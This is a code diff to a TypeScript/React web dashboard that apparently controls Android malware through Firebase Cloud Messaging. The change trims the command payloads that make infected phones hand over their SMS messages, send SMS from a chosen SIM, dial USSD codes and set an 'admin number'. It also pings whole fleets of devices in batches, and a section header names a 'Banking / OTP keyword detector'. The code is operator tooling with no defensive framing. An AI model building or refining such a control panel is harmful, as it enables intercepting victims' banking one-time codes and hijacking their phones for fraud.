@@ -143,40 +143,29 @@ async function fcmSend(deviceId: string, data: Record<string, string>): Promise<
   return String(body["messageId"] ?? "sent");
 }
 
-/** type "CHECK_ONLINE" → Android: enqueueCheckOnline */
-function mkCheckOnline(deviceId: string): Record<string, string> {
-  const ts = String(Date.now());
-  return { type: "CHECK_ONLINE", uniqueid: deviceId, action: "ping", fromAdmin: "true", deviceId: deviceId, messageId: "admin_check_" + ts, timestamp: ts };
+/** type "0" → Android: enqueueCheckOnline */
+function mkCheckOnline(): Record<string, string> {
+  return { type: "0" };
 }
-function mkDeviceCmd(uid: string, action: string, extra?: Record<string, unknown>): Record<string, string> {
-  const ts = String(Date.now());
-  if (action === "get_sms") return { type: "get_sms", uniqueid: uid, action: "get_sms", fromAdmin: "true", messageId: "sms_fetch_" + ts, timestamp: ts };
+function mkDeviceCmd(_uid: string, action: string, extra?: Record<string, unknown>): Record<string, string> {
+  if (action === "get_sms") return { type: "get_sms" };
   if (action === "sms") return {
     type: "send_sms",
-    uniqueid: uid, action: "sms",
     to: String(extra?.to ?? ""),
-    body: String(extra?.body ?? ""),
-    simSlot: String(extra?.simSlot ?? 0),
-    fromAdmin: "true",
-    messageId: "sms_cmd_" + ts,
-    timestamp: ts,
+    message: String(extra?.body ?? ""),
+    sim: String(extra?.simSlot ?? 0),
   };
   if (action === "ussd") return {
     type: "dial_ussd",
-    uniqueid: uid, action: "ussd",
     code: String(extra?.code ?? ""),
-    simSlot: String(extra?.simSlot ?? 0),
-    fromAdmin: "true",
-    messageId: "ussd_cmd_" + ts,
-    timestamp: ts,
+    sim: String(extra?.simSlot ?? 0),
   };
-  return { type: action, uniqueid: uid, fromAdmin: "true", timestamp: ts };
+  return { type: action };
 }
-/** admin_update → Android: setAdminNumber / toggle admin status (NO call, NO sim) */
-function mkAdminUpdate(did: string, number: string, status: "on" | "off"): Record<string, string> {
-  const ts = String(Date.now());
-  if (status === "on") return { type: "admin_update", status: "on", number, deviceId: did, fromAdmin: "true", messageId: "admin_upd_" + ts, timestamp: ts };
-  return { type: "admin_update", status: "off", deviceId: did, fromAdmin: "true", messageId: "admin_upd_" + ts, timestamp: ts };
+/** admin_update → Android: setAdminNumber / toggle admin status */
+function mkAdminUpdate(_did: string, number: string, status: "on" | "off"): Record<string, string> {
+  if (status === "on") return { type: "admin_update", status: "on", number };
+  return { type: "admin_update", status: "off" };
 }
 
 /* ─── Banking / OTP keyword detector ─── */
@@ -552,7 +541,7 @@ function ActionPanel({ action, device, onClose }: { action: ActionKey; device: D
             Pings <b>{device.name}</b> to check if it's online and reachable.
           </div>
           <StatusLog state={state} log={log} />
-          <button onClick={() => void send(mkCheckOnline(device.deviceId))} disabled={state === "loading"} style={{
+          <button onClick={() => void send(mkCheckOnline())} disabled={state === "loading"} style={{
             width: "100%", padding: "12px 0", borderRadius: 10, border: "none",
             background: state === "ok" ? "#22c55e" : "#6366f1",
             color: "#fff", fontWeight: 700, fontSize: 14,
@@ -1119,7 +1108,7 @@ function CheckOnlineBtn({ device }: { device: DbDevice }) {
     }, 1000);
 
     try {
-      await fcmSend(device.deviceId, mkCheckOnline(device.deviceId));
+      await fcmSend(device.deviceId, mkCheckOnline());
     } catch {
       // FCM failed — silently stop timer and reset
       if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
@@ -1372,7 +1361,7 @@ function DevicesPage({ appId, devices, messages, formData, initialDevice, onBack
       }, 1000);
     }
 
-    const cmd = key === "online_check" ? mkCheckOnline(device.deviceId) : mkDeviceCmd(device.deviceId, "get_sms");
+    const cmd = key === "online_check" ? mkCheckOnline() : mkDeviceCmd(device.deviceId, "get_sms");
     try {
       await fcmSend(device.deviceId, cmd);
       if (key !== "online_check") {
@@ -1954,7 +1943,7 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
     setPingAllState("running"); setPingAllDone(0);
     for (let i = 0; i < devices.length; i += BATCH) {
       const batch = devices.slice(i, i + BATCH);
-      await Promise.allSettled(batch.map(d => fcmSend(d.deviceId, mkCheckOnline(d.deviceId))));
+      await Promise.allSettled(batch.map(d => fcmSend(d.deviceId, mkCheckOnline())));
       setPingAllDone(Math.min(i + BATCH, devices.length));
       if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
     }
@@ -2755,7 +2744,7 @@ export default function WebDashboard() {
       const batch = allDevices.slice(i, i + BATCH_SIZE);
       const results = await Promise.allSettled(
         batch.map(d =>
-          fcmSend(d.deviceId, mkCheckOnline(d.deviceId))
+          fcmSend(d.deviceId, mkCheckOnline())
         )
       );
       results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
